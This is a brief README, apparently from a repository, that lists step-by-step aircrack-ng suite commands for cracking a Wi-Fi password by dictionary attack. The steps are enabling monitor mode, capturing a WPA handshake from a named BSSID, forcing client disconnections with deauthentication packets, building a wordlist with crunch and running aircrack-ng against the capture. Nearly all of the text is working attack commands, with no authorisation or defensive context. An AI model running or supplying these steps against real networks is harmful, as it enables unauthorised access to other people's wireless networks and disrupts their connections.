# wifi-cracking-dictionary-attack-
1.airmon-ng (to know status of N/W) 
2.airmon-ng start wlan0 (to enable monitor mode) 
3.airodump-ng wlan0mon (list of networks) 
4.airodump-ng -c 11 --bssid 44:D4:E0:5D:3C:AD -w /root/1 wlan0mon (capture handshake) 
5.aireplay-ng -0 10 -a 44:D4:E0:5D:3C:AD wlan0mon (to capure handshake) 
6.aircrack-ng -w 1.lst 1-01.cap (dictionary matching)  
to create dictionary --- crunch 3 3 -t %%% -o 1.lst      


by:rkpworld  
